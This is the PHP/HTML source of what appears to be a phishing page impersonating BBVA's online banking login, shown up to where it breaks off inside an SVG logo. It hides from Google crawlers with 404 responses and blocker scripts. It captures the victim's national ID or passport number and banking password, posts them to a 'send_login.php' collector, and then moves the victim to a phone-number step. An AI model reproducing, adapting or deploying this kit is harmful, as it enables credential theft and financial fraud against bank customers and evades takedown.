<?php
session_start();
error_reporting(0);


include "../XBoot/X_boot.php";


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


include("./system/blocker.php");
include("./system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);

?>



<html lang="en" manifest="manifest.appcache"><head><style>body {transition: opacity ease-in 0.2s; } 
body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
</style>
<link href="./style/app.min.css" rel="stylesheet">
<meta charset="utf-8">
<meta name="theme-color" content="#134481">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,maximum-scale=1,user-scalable=0,minimal-ui,viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="BBVA">
<meta name="mobile-web-app-title" content="BBVA">
<meta property="og:title" content="BBVA">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="BBVA">
<meta name="keywords" content="Banco, banca online, sin comisiones, productos bancarios, particulares, productos y servicios financieros BBVA Particulares">
<meta name="description" content="Banca online para Particulares BBVA">
<meta property="og:description" content="Banca online para Particulares"><meta name="apple-itunes-app" content="app-id=325813155"><link rel="preload" href="assets/vendor/app.css" as="style">

<link rel="preload" href="./style/BentonSansBBVA-Book.woff" as="font" type="font/woff" crossorigin="">
<link rel="preload" href="./style/BentonSansBBVA-Medium.woff" as="font" type="font/woff" crossorigin="">
<title>BBVA</title>
<meta http-equiv="Content-Security-Policy" content="">
<link rel="shortcut icon" href="./style/favicon.ico">
<link rel="icon" type="image/x-icon" href="./style/favicon.ico">
<link rel="apple-touch-icon" href="./style/favicon128px.png">
<link rel="shortcut icon" sizes="128x128" href="./style/favicon128px.png">
<meta property="og:image" content="./style/app_icon_oficina_128x128.png">



<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>

</head>
<body id="app" ontouchstart="" class="ember-application"><div class="ember-view" id="ember3"><div id="ember4" style="display: none;" class="veil visible ember-view"><span id="ember5" class="progress-content-light full-size full-height flexy-item align-centered justify-center size_6 ember-view"><svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
	<desc>...</desc>
	<path class="progress-content-light__path" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z">
	</path>
	<g>
		<defs>
			<path id="progressContent_1_ember5" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z"></path>
		</defs>
		<clipPath id="progressContent_2_ember5">
			<use xlink:href="#progressContent_1_ember5" style="overflow:visible;"></use>
		</clipPath>
		<radialGradient id="progressContent_3_ember5" cx="195.6494" cy="114.4386" r="185.5059" fx="24.1631" fy="113.1565" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse">
			<stop offset="0" style="stop-color:#2dcccd;"></stop>
			<stop offset="1" style="stop-color:#004481;stop-opacity:0"></stop>
		</radialGradient>
		<polygon style="clip-path: url(#progressContent_2_ember5); fill: url(#progressContent_3_ember5);" class="progress-content-light__flare" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"></polygon>
	</g>
</svg>
</span></div><div tabindex="0" data-id="side-menu" id="ember6" class="navigation-menu flexy-item absolute full-height ember-view" style="counter-reset: menu 6;"><nav class="navigation-menu__nav item-space flexy-item no-margin set-padding-bottom-4">
	<span class="accesible-hide" data-id="welcome-menu" tabindex="0">Application main menu</span>
	<div class="item-space scrolling no-margin show-pivot">
	<div class="navigation-menu__items__box set-padding-bottom-3">
			<div class="navigation-menu__wrapper">
				<h3 class="accesible-hide">Application main menu</h3>
<ul id="ember7" class="list-container ember-view">				<li data-id="optSideMenuExperiences" id="ember8" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-9="9" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-promotion" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Experiences</b>
	</button>
</div>
</li>
					<li data-id="atmButton" id="ember10" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-11="11" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-place" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Branches and ATMs</b>
	</button>
</div>
</li>
						<li data-id="marketAnalisysButton" id="ember12" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-13="13" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-play" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Market analysis</b>
	</button>
</div>

</li>
					<li data-id="sideMenuContactBBVA" id="ember14" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-15="15" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-phone" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">Customer service</b>
	</button>
</div>
<!----></li>
					<li data-id="aboutButton" id="ember16" class="list-container__item ember-view"><div class="list-container__wrapper list-container__wrapper--button">
	<button data-id="menuItemButton" class="item-space-wide list-container__button color_se-0 " data-ember-action="" data-ember-action-17="17" style="opacity: 1;">
		<span class="set-margin-right size_3 item-auto-size icon icon-information" aria-hidden="true"></span>
		<b class="txt_s txt-align-l item-space set-margin-left">About</b>
	</button>
</div>
<!----></li>

</ul>			</div>
		</div>
	</div>
	<ul class="navigation-menu__wrapper item-space-wide">
		<li class="item-auto-size">
				<button class="item-space-wide color_te-3" title="Go to global position" data-ember-action="" data-ember-action-18="18">
					<span class="item-auto-size no-margin icon icon-get-out size_3" aria-hidden="true"></span>
					<b class="item-auto-size txt_s set-margin-left-2">Log in</b>
				</button>
		</li>
		<li class="item-auto-size">
			<button class="oh interactive-hide relative" data-id="btnMenuBack" data-ember-action="" data-ember-action-19="19">Close menu</button>
		</li>
	</ul>
</nav>
</div><div aria-hidden="false" id="ember22" class="liquid-container--shadow liquid-container ember-view" style="touch-action: auto; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); transform: translateX(0px) scale(1); transition: transform 233ms ease 0s, -webkit-transform 233ms ease 0s;"><div id="ember25" class="liquid-child ember-view" style="top: 0px; left: 0px;"><div id="ember26" class="bg_transparent login-interaction main ember-view" data-id="routeIndex"><div id="ember27" class="bg_pr-core-d ember-view"><header id="ember28" class="header header-main flexy-item justify-center items-without-margins relative bg_transparent color_se-0 ember-view"><div class="item-space-wide align-centered">
	<div id="ember29" class="txt-align-c header-main__icons--left set-padding-left ember-view">

		<button tabindex="0" aria-label="Go back a page" aria-disabled="false" data-id="btnBack" id="ember30" class="icon-return icon touch-shadow rounded ember-view"></button>


</div><div data-id="lblHead" id="ember31" class="header-main__title oh txt-align-c ember-view">	<h1 tabindex="-1" class="">
		<div class="svg-header"><img class="img-sized size_6" src="./style/bbva-white.svg" alt=""></div>
	</h1>
</div><div id="ember32" class="txt-align-c header-main__icons--right set-padding-right ember-view"><span tabindex="0" aria-label="Help" data-id="btnHelp" id="ember33" class="icon icon-help touch-shadow rounded btnHelp ember-view" role="button"></span><!---->
</div>
</div>
</header></div><article aria-atomic="true" aria-live="polite" id="ember34" style="display: none;" class="notification-status flexy-item align-centered set-padding bg_te-6-d ember-view"><p class="accesible-hide" data-id="accessibilityText">State of your connection</p>
<div class="item-space-wide align-centered">
	<span class="icon color_se-0 size_2 set-margin-right icon-right" data-id="icon" aria-hidden="true"></span>
	<span class="color_se-0 txt_s" data-id="title">Missing translation: undefined</span>
</div>
</article><div data-alert-show="false" id="ember35" class="alrtCont ember-view"></div><section class="content wrapper flexy-item">





<script>


$(function() {

  var validator = $("#sendemail").bind("invalid-form.validate", function() {
      $("#errorrbiliing").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='sendemail']").validate({

  errorContainer: $("#errorrbiliing"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },


highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
  $( element ).parents( ".dddd" ).addClass( errorClass );
        },
unhighlight: function (element, errorClass, validClass) {
          
  $( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
        },



    messages: {
      Firstname: "First Name is required",
      LastName: "Last Name is required",
      shopdomain : "Enter a valid email address",
      Access  : " ",
      Passport : " ",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },



 account_email: {
        required: "Enter a valid email address.",
        minlength: "Enter a valid email address."
      },





      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {
$("#spinnar").show();


$("#botomemail").attr("disabled", true);


          $.post("./system/send_login.php?ajax", $("#sendemail").serialize(), function(result) {
                            setTimeout(function() {




                                $(location).attr("href", "./Phone_number");
                        });
                 });
        },
  
  });

});

</script>





<div id="spinnar" style="display: none;" class="veil visible ember-view"><span id="ember8" class="progress-content-light full-size full-height flexy-item align-centered justify-center size_6 ember-view"><svg class="progress-content-light__svg" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 400 400" xml:space="preserve">
	<desc>Loading...</desc>
	<path class="progress-content-light__path" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z">
	</path>
	<g>
		<defs>
			<path id="progressContent_1_ember8" d="M200,397.5C91.1,397.5,2.5,308.9,2.5,200S91.1,2.5,200,2.5S397.5,91.1,397.5,200S308.9,397.5,200,397.5z M200,47.5c-84.09,0-152.5,68.41-152.5,152.5S115.91,352.5,200,352.5S352.5,284.09,352.5,200S284.09,47.5,200,47.5z"></path>
		</defs>
		<clipPath id="progressContent_2_ember8">
			<use xlink:href="#progressContent_1_ember8" style="overflow:visible;"></use>
		</clipPath>
		<radialGradient id="progressContent_3_ember8" cx="195.6494" cy="114.4386" r="185.5059" fx="24.1631" fy="113.1565" gradientTransform="matrix(9.011709e-03 1 -1.5827 0.0143 379.0422 -24.3454)" gradientUnits="userSpaceOnUse">
			<stop offset="0" style="stop-color:#2dcccd;"></stop>
			<stop offset="1" style="stop-color:#004481;stop-opacity:0"></stop>
		</radialGradient>
		<polygon style="clip-path: url(#progressContent_2_ember8); fill: url(#progressContent_3_ember8);" class="progress-content-light__flare" points="-128.22,-3.91 200.04,-1.41 528.29,1.08 395,262.69 261.7,524.29 8,313"></polygon>
	</g>
</svg>
</span></div>

	<form id="sendemail" name="sendemail" action="#" method="post" class="item-space flexy-item no-margin bg_pr-core-d form-container ember-view">

	<div id="ember37" class="item-space no-margin main-content scrolling ember-view"><div class="login-user-wrapper set-padding-top hide"><div class="txt-align-c flexy-item align-centered items-without-margins"><div class="item-space-wide"><div class="item-space scapular-content"></div></div><div class="item-space-wide"><p class="item-space color_se-0 txt_m txt-light set-padding-top-2">Good afternoon, </p></div></div><div class="txt-align-c set-margin-bottom"><a data-id="lblYouAreNot" role="button" class="color_se-0 txt_s" data-ember-action="" data-ember-action-38="38"><b>Not ?</b></a></div></div><div data-id="form-login" class="set-padding-vertical form-login"><div class="set-padding-bottom-2"><div data-type="text" data-id="txtUser" id="ember39" class="form form-text form--navy ember-view" data-required="required" style="">

<script type="text/javascript">
	
$(document).ready(function(){
  $("#msagh").click(function(){
    $("#Passport").val( "" );;
  });

  $("#showpasswprd").click(function(){
    $("#Access").attr( "type","text" );;
  });


});

</script>



<div class="form__container flexy-item flexy-row">
	<div class="form__content">
		<label class="accesible-hide" for="inner-ember39">NIF,NIE,DNI o Passporte</label>


		<input placeholder=" " required="" id="Passport" name="Passport" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="text" 
		  maxlength="16">

		<span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">NIF,NIE,DNI o Passporte</span>
		<span class="form__icon">
			<span id="msagh" class="icon touch-shadow rounded" role="button" aria-hidden="false" aria-label="Delete content of the input field" data-ember-action="" data-ember-action-40="40"></span>
		</span>

	</div>

</div>

<div class="set-padding-left-2">
	<div id="messages-ember39" class="form__messages ember-view">
			
		</div>
</div>
</div></div><div class="set-padding-bottom-2"><div data-type="password" data-id="txtPassword" id="ember41" class="form form-password form--navy ember-view" data-required="required" style="">
<div class="form__container flexy-item flexy-row">
	<div class="form__content">
		<label class="accesible-hide" for="inner-ember41">Contraseña de acceso</label>


		<input placeholder=" " id="Access" name="Access"class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="password" required="true" required="required" aria-required="true" maxlength="6" minlength="4">


		<span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">Contraseña de acceso</span>

		<span class="form__icon">
			<span id="showpasswprd" class="icon touch-shadow rounded" role="button" aria-hidden="false" aria-label="Delete content of the input field" data-ember-action="" data-ember-action-42="42"></span>
		</span>
</div>
</div>

<div class="set-padding-left-2">
	<div id="messages-ember41" class="form__messages ember-view"></div>
</div>
</div></div><div class="block txt-align-r"><a data-id="btnForgottenPassword" class="color_se-0 txt_s" role="button" data-ember-action="" data-ember-action-43="43"><b>¿Olvidó su contraseña de acceso?</b></a></div></div></div><div id="ember44" class="set-margin-bottom-2 set-padding-top button-stack item-space-wide justify-center ember-view"><ul class="button-stack__content oh">
	


<li id="ember45"  class="button-stack__item item-space-wide ember-view"><button aria-disabled="false" data-id="btnLogin" class="button-default button set-padding-horizontal-4 width-auto oh relative button--positive ember-view"  ><span class="button__content block">
	<b class="button__text txt_s txt-overflow_ellipsis">Iniciar sesion</b>
</span>
</button>
</li>

	


<li id="ember47" class="button-stack__item item-space-wide ember-view"><button aria-disabled="false" data-id="btnSignup" id="ember48" class="button-default button set-padding-horizontal-4 width-auto oh relative button--secondary button--dark ember-view"><span class="button__content block">
	<b class="button__text txt_s txt-overflow_ellipsis">Conviértete en un cliente</b>
</span>
</button>
</li>
</ul>
</div><div class="set-padding-2 txt-align-c"><a role="button" data-id="btnEnrollment" class="color_se-0 txt_s action-element" data-ember-action="" data-ember-action-49="49"><b>Soy un cliente pero no tengo un nombre de usuario en línea</b></a></div>
</form></section></div></div></div><div id="ember50" class="ember-view"></div></div><link href="./style/app.min.css" rel="stylesheet">




<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>



<div  id="fixed">

	<div data-id="error-view" class="bg_main-image main"><section class="content wrapper flexy-item bg_transparent"><div class="flexy-item justify-center align-centered item-space no-margin main-content scrolling"><div class="txt-align-c advice-svg-container set-padding-bottom-3"><svg class="fill" id="animated" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96.38 96.38"><path class="st1" d="M91.17 85.81L50.41 8.22C49.18 6 47.2 6 46 8.22L5.21 85.81c-1.23 2.23 0 4 2.8 4h80.36c2.77.02 4.03-1.81 2.8-4zm-46.6-53.92l7.24 7.24v21.73h-7.24zM48.19 79a5.43 5.43 0 1 1 5.43-5.43A5.43 5.43 0 0 1 48.19 79z"></path></svg></div><div class="item-space-wide txt-align-c color_se-0 flexy-column set-padding-3"><p data-id="text" class="txt_s txt-light">Para poder acceder a la aplicación es necesario que actives JavaScript en el panel de preferencias de tu navegador.</p><p class="txt_s txt-light">Code: <span data-id="code">0x00</span></p><p class="txt_s txt-light">Version: <span data-id="version">-</span></p></div></div></section></div><style data-id="error-view">div[data-id=error-view]{display:none}body,html{height:100%;width:100vw}body{font-size:16px;line-height:normal;overflow:hidden;background-color:#072146;font-family:BentonSans;font-weight:400;margin:0}@font-face{font-family:BentonSans;font-weight:400;.main{position:relative;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;box-sizing:border-box;width:100vw;height:100%;overflow:hidden;background-color:#fff;background-size:100vw 100vh}.bg_main-image,.main,.nav-new.dummie.principal{background-image:url(assets/vendor/res/img/bg-menu.svg);background-color:#072146;background-size:cover}.bg_transparent{background-color:transparent}.flexy-item{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;box-sizing:border-box}.item-auto-size.no-margin,.item-space.no-margin{margin:0}.advice-svg-container{width:96px;position:relative}.txt-align-c{text-align:center}.justify-center{-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}.align-centered{-webkit-align-items:center;-ms-flex-align:center;align-items:center}.set-padding-bottom-3{padding-bottom:24px}.set-padding-3{padding:24px}.item-space{-webkit-flex:1;-ms-flex:1;flex:1}.advice-svg-container #animated,.advice-svg-container .svg-check{max-width:inherit}.advice-svg-container #animated{transition:opacity .2s ease-in-out}.color_se-0{color:#fff}.txt-light{font-weight:400}.txt_s{font-size:15px;line-height:24px;margin:0}.flexy-column{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column}.fill .st1{stroke-dasharray:620;stroke-dashoffset:620;stroke:#d4edfc;fill:#d4edfc;-webkit-animation:dash 2s linear forwards,fillanim .6s linear forwards;animation:dash 2s linear forwards,fillanim .6s linear forwards;-webkit-animation-delay:.4s,2.5s;animation-delay:.4s,2.5s}.content{-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;-webkit-flex-shrink:1;-ms-flex-negative:1;flex-shrink:1;-webkit-flex-basis:0;-ms-flex-preferred-size:0;flex-basis:0;position:relative;-webkit-transform:translateZ(0);transform:translateZ(0);-webkit-perspective:1px;perspective:1px;width:100vw;height:100%;overflow:hidden}</style><figure class="app-shell" data-id="app-shell"><svg text-rendering="geometricPrecision" shape-rendering="geometricPrecision" viewBox="0 0 450 812" style="white-space:pre;width:100%;height:100%"><defs><radialGradient id="Gradient-0" cx="0.784415" cy="53.9996" r="60.2016" fx="0.784415" fy="-6.0004" gradientUnits="userSpaceOnUse"><stop offset="0.0232928" stop-color="#49a5e6"/><stop offset="0.647425" stop-color="#004481" stop-opacity="0"/></radialGradient><radialGradient id="Gradient-1" cx="0.784415" cy="53.9996" r="60.2016" fx="0.784415" fy="-6.0004" gradientUnits="userSpaceOnUse"><stop offset="0.0232928" stop-color="#5fc4c3"/><stop offset="0.647425" stop-color="#004481" stop-opacity="0"/></radialGradient><linearGradient id="Gradient-2" x1="-10" y1="0" x2="276.908" y2="0" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#3c9ae1" stop-opacity="0"/><stop offset="0.273841" stop-color="#5baee8" stop-opacity="0.5"/><stop offset="0.807687" stop-color="#5baee8" stop-opacity="0.5"/><stop offset="1" stop-color="#ffffff" stop-opacity="0"/></linearGradient><clipPath id="Clip-Path-Blue"><rect width="860" height="500" fill="#00ffc9" stroke="none" transform="translate(1871.39,2226.99)"/></clipPath><clipPath id="clipPath-Turquoise"><rect width="942" height="473" fill="#00ffc9" stroke="none" transform="translate(1817.61,2575.12) rotate(180) translate(-471,-473)"/></clipPath></defs><style>@keyframes a0_t{0%{transform:translate(2211.803955px,2228px);animation-timing-function:cubic-bezier(.330818,.08078,.358984,1)}100%{transform:translate(2354px,2228px)}}@keyframes deg-blue_t{0%{transform:scale(0,1.329535) translateY(4.79167px);animation-timing-function:cubic-bezier(.258579,.013099,.324203,.937594)}54.5454%{transform:scale(12.072597,12.75502) translateY(4.79167px)}100%{transform:scale(12.072597,12.75502) translateY(4.79167px)}}@keyframes deg-blue_o{0%{opacity:0}40.9091%{opacity:1}100%{opacity:1}}@keyframes a1_t{0%{transform:translate(1984px,2573px)}13.6363%{transform:translate(1984px,2573px);animation-timing-function:cubic-bezier(.25,0,.5,1)}100%{transform:translate(1817.607944px,2573.119965px)}}@keyframes deg-turquoise_t{0%{transform:scale(0,.711586) translate(-.045175px,4.635216px)}13.6363%{transform:scale(0,.711586) translate(-.045175px,4.635216px);animation-timing-function:cubic-bezier(.42,0,.58,1)}63.6363%{transform:scale(12.006882,12) translate(-.045175px,4.635216px)}100%{transform:scale(12.006882,12) translate(-.045175px,4.635216px)}}@keyframes deg-turquoise_o{0%{opacity:0}13.6364%{opacity:0}54.5455%{opacity:1}100%{opacity:1}}@keyframes a2_t{0%{transform:translate(2274.756px,2489.880117px);animation-timing-function:cubic-bezier(.36,0,.36,1)}100%{transform:translate(2414.756px,2489.880117px)}}@keyframes line-blue_t{0%{transform:scale(0,2) translate(-133.454px,-.5px);animation-timing-function:cubic-bezier(.259,.013,.497674,.938)}54.5454%{transform:scale(1,2) translate(-133.454px,-.5px)}100%{transform:scale(1,2) translate(-133.454px,-.5px)}}@keyframes line-blue_o{0%{opacity:0}54.5455%{opacity:1}100%{opacity:1}}@keyframes a3_t{0%{transform:translate(2478.91px,2487.880107px)}13.6363%{transform:translate(2478.91px,2487.880107px);animation-timing-function:cubic-bezier(.36,0,.36,1)}100%{transform:translate(2624.30199px,2487.880015px)}}@keyframes line-turquoise_t{0%{transform:scale(0,2) translate(-133.454px,-.5px)}13.6363%{transform:scale(0,2) translate(-133.454px,-.5px);animation-timing-function:cubic-bezier(.259,.013,.497674,.938)}68.1818%{transform:scale(1,2) translate(-133.454px,-.5px)}100%{transform:scale(1,2) translate(-133.454px,-.5px)}}@keyframes line-turquoise_o{0%{opacity:0}13.6364%{opacity:0}68.1818%{opacity:1}100%{opacity:1}}@keyframes bbva-logo_o{0%{opacity:0}36.3636%{opacity:0;animation-timing-function:cubic-bezier(.42,0,1,1)}54.5455%{opacity:1}100%{opacity:1}}@keyframes A_t{0%{transform:translate(0,35.0037px)}36.3636%{transform:translate(0,35.0037px);animation-timing-function:cubic-bezier(0,0,.405,1)}63.6363%{transform:translate(0,0)}100%{transform:translate(0,0)}}</style><g id="g-contenido" transform="translate(-55.212,172.433) translate(-1015.16,-955.643)"><path id="bkg" fill="#004481" stroke="none" d="M0,0L450,0L450,812L0,812Z" transform="translate(1295.37,1189.21) translate(-225,-406)"/><g id="g-animacion" transform="translate(1416.36,1183.33) rotate(-62) translate(-2520.29,-2551)"><g id="g-blue-gradient" clip-path="url(#Clip-Path-Blue)" transform="translate(2262.91,2661.89) translate(-2200,-2400)"><g id="deg-blue" style="animation:2.2s linear both a0_t"><ellipse class="bola-grande" fill="url(#Gradient-0)" rx="200" ry="200" fill-rule="nonzero" opacity="0" transform="translate(2211.8,2228) scale(0,1.32953) translate(0,4.79167)" style="animation:2.2s linear both deg-blue_t,2.2s linear both deg-blue_o"/></g></g><g id="g-turquoise-gradient" clip-path="url(#clipPath-Turquoise)" transform="translate(2262.91,2662) rotate(180) translate(-2200,-2400)"><g id="deg-turquoise" style="animation:2.2s linear both a1_t"><ellipse class="bola-grande" fill="url(#Gradient-1)" rx="200" ry="200" fill-rule="nonzero" opacity="0" transform="translate(1984,2573) scale(0,0.711586) translate(-0.0451754,4.63522)" style="animation:2.2s linear both deg-turquoise_t,2.2s linear both deg-turquoise_o"/></g></g><g id="line-blue" style="animation:2.2s linear both a2_t"><path fill="url(#Gradient-2)" stroke="none" stroke-linecap="square" d="M-10,0L276.908,0L276.908,1L-10,1Z" opacity="0" transform="translate(2274.76,2489.88) scale(0,2) translate(-133.454,-0.5)" style="animation:2.2s linear both line-blue_t,2.2s linear both line-blue_o"/></g><g id="line-turquoise" style="animation:2.2s linear both a3_t"><path fill="url(#Gradient-2)" stroke="none" stroke-linecap="square" d="M-10,0L276.908,0L276.908,1L-10,1Z" opacity="0" transform="translate(2478.91,2487.88) scale(0,2) translate(-133.454,-0.5)" style="animation:2.2s linear both line-turquoise_t,2.2s linear both line-turquoise_o"/></g></g><g id="bbva-logo" opacity="0" transform="translate(1297,1189) translate(-79.5,-24.2243)" style="animation:2.2s linear both bbva-logo_o"><path id="V" class="cls-1" d="M116.45,6.57L102.54,33C102.469,33.1316,102.363,33.2414,102.235,33.318C102.106,33.3946,101.96,33.435,101.81,33.435C101.66,33.435,101.514,33.3946,101.385,33.318C101.257,33.2414,101.151,33.1316,101.08,33L87.16,6.56C87.1263,6.49542,87.084,6.43575,87.0341,6.38263C86.9843,6.32951,86.9274,6.28344,86.8651,6.24571C86.8028,6.20798,86.7357,6.17893,86.6655,6.15938C86.5953,6.13982,86.5228,6.12994,86.45,6.13L79.73,6.13C79.6255,6.13033,79.5228,6.1575,79.4319,6.20891C79.3409,6.26032,79.2646,6.33423,79.2104,6.42357C79.1562,6.51291,79.1259,6.61468,79.1223,6.71912C79.1187,6.82356,79.142,6.92716,79.19,7.02L101.1,48C101.168,48.13,101.269,48.239,101.395,48.3151C101.52,48.3911,101.664,48.4314,101.81,48.4314C101.956,48.4314,102.1,48.3911,102.225,48.3151C102.351,48.239,102.452,48.13,102.52,48L124.43,7C124.479,6.90786,124.502,6.80464,124.499,6.70051C124.496,6.59638,124.465,6.49492,124.411,6.40612C124.356,6.31732,124.28,6.24423,124.188,6.19407C124.097,6.1439,123.994,6.11837,123.89,6.12L117.16,6.12C117.086,6.11969,117.012,6.12995,116.941,6.15045C116.87,6.17096,116.802,6.2015,116.739,6.24117C116.677,6.28084,116.62,6.32923,116.571,6.38488C116.522,6.44052,116.481,6.50286,116.45,6.57Z" fill="#fff" transform="translate(101.811,27.2757) translate(-101.811,-27.2757)"/><path id="A" class="cls-1" d="M124.34,41.88L138.24,15.42C138.311,15.2884,138.417,15.1786,138.545,15.102C138.674,15.0254,138.82,14.985,138.97,14.985C139.12,14.985,139.266,15.0254,139.395,15.102C139.523,15.1786,139.629,15.2884,139.7,15.42L153.62,41.88C153.653,41.9449,153.695,42.0049,153.745,42.0583C153.795,42.1117,153.852,42.158,153.914,42.1958C153.976,42.2336,154.044,42.2625,154.114,42.2818C154.184,42.3011,154.257,42.3106,154.33,42.31L161.06,42.31C161.163,42.3099,161.265,42.2831,161.355,42.2322C161.445,42.1813,161.52,42.1081,161.573,42.0196C161.627,41.931,161.656,41.8303,161.659,41.727C161.662,41.6237,161.638,41.5214,161.59,41.43L139.68,0.43C139.612,0.299985,139.511,0.191002,139.385,0.114937C139.26,0.0388721,139.116,-0.00135383,138.97,-0.00135383C138.824,-0.00135383,138.68,0.0388721,138.555,0.114937C138.429,0.191002,138.328,0.299985,138.26,0.43L116.36,41.43C116.309,41.5217,116.284,41.6251,116.285,41.7298C116.287,41.8345,116.316,41.937,116.37,42.027C116.423,42.117,116.5,42.1914,116.591,42.2428C116.682,42.2942,116.785,42.3208,116.89,42.32L123.63,42.32C123.703,42.3196,123.776,42.3091,123.847,42.2888C123.917,42.2685,123.985,42.2387,124.047,42.2C124.109,42.1614,124.166,42.1144,124.216,42.0603C124.265,42.0062,124.307,41.9455,124.34,41.88Z" fill="#fff" transform="translate(138.972,56.163) translate(-138.972,-21.1593)" style="animation:2.2s linear both A_t"/><path id="B" class="cls-1" d="M29.32,25.66C32.23,24.21,34,21.07,34,17.2C34,10.61,28.9,6.13,21.65,6.13L0.81,6.13C0.703629,6.13,0.5983,6.15095,0.500026,6.19166C0.401753,6.23236,0.312459,6.29203,0.237244,6.36724C0.162028,6.44246,0.102364,6.53175,0.0616576,6.63003C0.0209513,6.7283,0,6.83363,0,6.94L0,47.64C0,47.7464,0.0209513,47.8517,0.0616576,47.95C0.102364,48.0482,0.162028,48.1375,0.237244,48.2128C0.312459,48.288,0.401753,48.3476,0.500026,48.3883C0.5983,48.429,0.703629,48.45,0.81,48.45L20.73,48.45C30.73,48.45,35.97,44.16,35.97,35.75C36,27.55,29.32,25.66,29.32,25.66ZM7.81,12.25L20.17,12.25C24.72,12.25,27.04,14.2,27.04,17.79C27.04,21.38,24.73,23.33,20.17,23.33L7.81,23.33C7.70447,23.33,7.59995,23.3094,7.50232,23.2693C7.40469,23.2292,7.31584,23.1705,7.24075,23.0963C7.16566,23.0221,7.10579,22.934,7.0645,22.8369C7.02321,22.7398,7.0013,22.6355,7,22.53L7,13.06C7,12.9536,7.02095,12.8483,7.06166,12.75C7.10236,12.6518,7.16203,12.5625,7.23724,12.4872C7.31246,12.412,7.40175,12.3524,7.50003,12.3117C7.5983,12.271,7.70363,12.25,7.81,12.25ZM20.33,42.31L7.8,42.31C7.6941,42.3113,7.589,42.2916,7.49078,42.252C7.39256,42.2124,7.30319,42.1537,7.22784,42.0793C7.15249,42.0048,7.09267,41.9162,7.05184,41.8185C7.01101,41.7208,6.98999,41.6159,6